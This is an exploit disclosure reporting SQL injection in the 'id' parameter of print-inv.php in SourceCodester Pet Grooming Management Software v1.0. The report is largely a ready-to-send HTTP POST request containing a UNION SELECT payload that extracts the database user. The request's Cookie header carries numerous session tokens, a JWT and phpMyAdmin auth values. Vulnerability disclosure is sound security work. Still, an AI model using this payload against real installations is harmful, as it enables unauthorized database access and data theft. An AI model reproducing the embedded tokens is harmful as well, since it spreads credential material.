# SourceCodester Pet Grooming Management Software print-inv.php sql injection Vulnerability

- **Exploit Title**: SourceCodester Pet Grooming Management Software print-inv.php sql injection Vulnerability
- **Exploit Author**: webraybtl@webray.com.cn inc
- **Vendor Homepage**: https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html
- **Software Link**: https://www.sourcecodester.com/download-code?nid=18340&title=Pet+grooming+management+software+download
- **Version**: SourceCodester Pet Grooming Management Software v1.0
- **Tested on:**  PHP 8.4.5, OpenResty1.21.4.3-3-3-focal
- **CVE:**  Reported, waiting for CVE number.

## Description

SourceCodester Pet Grooming Management Software `/admin/print-inv.php` **id** parameter has a SQL injection Vulnerability.

#### Payload used:

```text
POST /admin/print_inv.php HTTP/1.1
Host: 192.168.56.134:8091
Referer: http://192.168.56.134:8091/assets/app/auth.php
Cache-Control: no-cache
Cookie: pma_lang=zh_CN; SecurityEntrance=eXlkczk5OXB5cA%3D%3D; siyuan=MTc1NzM4NzM3OHxEWDhFQVFMX2dBQUJFQUVRQUFCM180QUFBUVp6ZEhKcGJtY01CZ0FFWkdGMFlRWnpkSEpwYm1jTVd3QlpleUpYYjNKcmMzQmhZMlZ6SWpwN0lpOXphWGwxWVc0dmQyOXlhM053WVdObEx5STZleUpCWTJObGMzTkJkWFJvUTI5a1pTSTZJbmw1WkhNNU9UbHdlWEFpTENKRFlYQjBZMmhoSWpvaU4zVjNOV281YVNKOWZYMD18-NJgGTSKBrd2kKUlew_K8HR-16vvEdrQzMb-T0jhpSA=; x-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiY2QxYzRlMDYtN2VmZi00NGUxLWFmZGMtMTJkMzI4ZGY0NjkwIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTc1ODA3ODk2MywibmJmIjoxNzU3NDc0MTYzfQ.zgX2-M742qcxbWtFvcaTrhEVdAcaPuN-xGsERCix7gY; panel_public_key=LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFySVJieXM3MlowTUpraDF3WTFZMQpHNDBLTURRZ2ZzSGt4UURwcFRNd0ZVb042cS8weUdOczJDYmVvcVNoaXY0TkRkMUNnQWEzV0Y3QmxvM1NWbWVRCnNrT21XdGFtdlI5SVJNSGwxVHl3ekYyRWlCekdhMS9wMDFZS1Y1Si9LVHhTcVBObll4UW9JU1hiQWE1eDJ5YWkKVU9tN1hCTzk4NXd6U3J0ZFFKWXovYUhRemNaQkZPZUtLaDV3UEU3YmlqbjhBSkpkOTcvVXl3WGJnZUY4WGNudQp3S0hkUDhOR21WVGtVNi8xWlovOTJYVThFRHBObVhxR2N0YUtWQ2FwUW1GUG04akNja3o2bGUyMjhxRHptemhiCjA1QWVlUHN1ZE9mRlJEd01iaEw2K1BhZ0RCN0ovK3ROZUhNdy93MFlSUzJYUG9HaVpKK3hXb0NFejVUdEo4Qm8KelFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg%3D%3D; psession=101ed4aa-5e20-4685-81e5-38a8c0a47390; phpMyAdmin=8574852e1e8fad14fd360a2ecab7739a; pmaUser-1=Q5uHmYnsrRiYtLZuLxqqJPfwS%2B79Q1vAu5MOC2dXqnMwHl6kb1%2BgOctvZG%2BkTeBU44Y0pQ%3D%3D; pmaAuth-1=lIgn%2BcZpMcm0oRSYsXGuD%2FEQkotmLx8kcN4db0S3yl4TMyyOc7rsYqAjjdQa4y%2BWp8Jlx%2FaMpTPeoOYQCCpMhRWvakjGhXMroQf1YsJ%2BiBcvp1G2XOipl%2BrB2pmAIUS%2FCA%3D%3D; PHPSESSID=7gsi5su92anfsdjknco5umf3sj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Content-Length: 309

id=-5491' UNION ALL SELECT 1,NULL,CONCAT(0x27,user(),0x27),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

## Proof of Concept

- Construct the post request package and send it to the `/admin/print-inv.php`. Successfully saw that the information existed in the response.

![image](assets/image-20250917172400-qzd1snw.png)

- Upon reviewing the source code, it was discovered that the `id` parameter was directly concatenated into the SQL statement.

![image](assets/image-20250917172432-y7dlbsq.png)

‚Äç
